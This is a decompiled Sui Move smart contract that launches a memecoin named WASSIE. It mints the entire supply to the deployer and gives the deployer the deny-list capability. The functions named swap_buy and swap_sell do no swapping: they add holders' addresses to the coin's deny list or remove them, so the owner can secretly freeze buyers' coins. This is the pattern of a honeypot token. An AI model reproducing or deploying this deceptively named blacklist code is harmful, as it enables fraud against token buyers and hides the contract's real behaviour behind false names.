module 0xce9b30558b88f4b478b340836e215cf98f7797bf22ecbfcb73345c031861722::wassie {
    struct WASSIE has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: WASSIE, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<WASSIE>(arg0, 9, b"WASSIE", b"WASSIE on SUI", b"WASSIE is a memecoin launched on the SUI blockchain, paying homage to a beloved internet meme. The Wassie meme originated in 2017 by user wasserpest, and evolved through interactions involving inversebrah and various other contributors. The first illustration appeared in 2016 on Twitter now X and was drawn by Japanese hentai artist Tukinowagamo. WASSIE aspires to position itself among the leading meme-inspired cryptocurrencies in the market. More information can be found at www.wassie.wtf", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmRXULSyBe271rd44qmXHrbCYEbe9GQi6aWbHrFhdZQAEC"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<WASSIE>(&mut v3, 1000000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<WASSIE>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<WASSIE>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<WASSIE>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<WASSIE>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<WASSIE>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<WASSIE>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<WASSIE>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

